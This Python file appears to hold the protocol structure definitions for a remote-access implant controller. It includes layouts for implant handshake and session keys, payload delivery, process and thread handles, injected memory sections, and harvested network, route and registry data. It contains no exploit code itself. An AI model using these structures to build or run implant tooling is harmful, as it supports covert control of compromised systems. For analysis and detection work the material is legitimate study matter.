import eternalhush as eh

HELLO_REQUEST = {
    "val1": eh.LONG,
    "val2": eh.LONG,
    "inital_data": 248
} 

HELLO_RESPONSE = {
    "implant_info": 256,
    "next_iv": 16
}
IMPLANT_INFO = {
    "implant_version": eh.LONG,
    "implant_id": eh.LONG,
    "session_key": 32,
    "implant_arch": eh.SHORT,
    "platform_arch": eh.SHORT,
    "implant_platform": eh.SHORT,
    "nt_major": eh.SHORT,
    "nt_minor": eh.SHORT,
    "buildno_major": eh.SHORT,
    "buildno_minor": eh.SHORT
}

PAYLOADINFO = {
	"payload_size": eh.LONG,
	"payload_type": eh.SHORT,
	"payload_arch": eh.SHORT,
	"payload_argc": eh.SHORT,
	"padding": 6
}

PROCESS_INFO = {
    "pid": eh.LONG,
    "tid": eh.LONG,
    "hprocess": eh.LONG,
    "hthread": eh.LONG,
    "hread": eh.LONG,
    "hwrite": eh.LONG
}
THREAD_INFO = {
    "tid": eh.LONG,
    "hthread": eh.LONG
}
SECTION_INFO = {
    "local_ptr": eh.LONGLONG,
    "remote_ptr": eh.LONGLONG
}

REG_VALUE_INFO = {
   "type": eh.LONG,
    "size": eh.LONG,
    "data": 0xff
}

NETWORK_PARAMS = {
    "hostname": 132,
    "domainname": 132,
    "dns_count": eh.LONG,

    "dns_buffer": 128,

    "node_type": eh.LONG,
    "enable_routing": eh.LONG,
    "enable_proxy": eh.LONG,
    "enable_dns": eh.LONG
}
STR_IP_ADDR = {
    "addr": 16
}

NETWORK_ADAPTER_INFO = {
    "type": eh.LONG,
    "name" : 260,
    "description": 132,
    "physical_address": 17,
    "enable_dhcp": eh.LONG,
    "netaddr_count": eh.LONG,
    "netaddr_buffer": 512,
    "gateway_count": eh.LONG,
    "gateway_buffer" : 128,
    "dhcp_server": 16
}
NETWORK_ROUTE_INFO = {
    "destination_address": 16,
    "netmask": 16,
    "gateway": 16,
    "interface_address": 16,
    "interface_id": eh.LONG,
    "metric": eh.LONG,
    "origin": eh.LONG
}